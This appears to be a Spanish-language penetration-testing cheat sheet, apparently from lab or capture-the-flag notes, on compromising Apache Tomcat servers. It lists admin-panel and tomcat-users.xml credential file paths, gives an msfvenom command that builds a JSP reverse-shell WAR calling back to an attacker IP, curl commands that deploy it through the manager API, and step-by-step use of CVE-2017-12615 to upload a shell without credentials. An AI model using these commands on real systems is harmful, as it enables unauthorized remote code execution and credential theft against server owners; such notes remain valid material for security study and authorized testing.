# Tomcat 

Tags: #Tomcat #Windows

## Ruta en la web

```bash 
/manager/html                # Ruta tipica que contiene un panel de autenticacion en donde se encuentra el panel de admin en Tomcat 
/host-manager/html           # Ruta alternativa 

/manager/status/             # Muestra la version de Tomcat         
```

## Ruta en consola

```bash 
/etc/tomcat9/tomcat-users.xml              # Archivo que contiene usuarios y sus passwd
/usr/share/tomcat9/etc/tomcat-users.xml    # Ruta alternativa
```

## Crear una aplicación para subirla desde el panel Tomcat  

```bash 
# En el panel de manager, encontramos una opción en donde podemos subir un archivo .war, por lo que hacemos lo siguiente:

❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war -o shell.war # Creamos nuestro archivo malicioso .war 

	# p = Payload
	# LHOST = Local Host (IP Atacante)
	# LPORT = Local Port 'Atacante'
	# f = Formato war
	# o = Exportar como 'shell.war'
```

## Subir una aplicación desde la consola con credenciales validas de 'admin'

```bash 
❯ curl -s -u 'username:passwd' -X GET "http://IP/manager/text/list"    # Listar aplicaciones existentes en Tomcat si tenemos credenciales validas 

- [ ] ❯ curl -s -u 'username:passwd' "http://IP/manager/text/deploy?path=/shell" --upload-file shell.war  # Desplegar la aplicacion creada anteriormente 
```

## Subir una aplicación sin credenciales CVE-2017-12615

```bash 
# Utilizando el Tomcat < 9.0.1 (beta) < 8.5.23 

1. Crear el archivo malicioso con 'Msfvenom'

❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f raw -o shell.jsp # Creamos nuestro archivo malicioso .jsp
	
2. Capturar con Burpsuite la peticion del puerto 8080
3. Colocar en la cabecera 'PUT /shell.jsp' para cargar el archivo antes creado en el Tomcat
4. Mandar la peticion 

Nota: Si al momento de cargar el archivo por la web para obtener la revershell nos muestra el contenido del archivo. Agregar ese contenido al 'Body' de nuestra peticion en Burpsuite y al momento de volverlo a mandar, ahora si nos dara la Revershell. 
```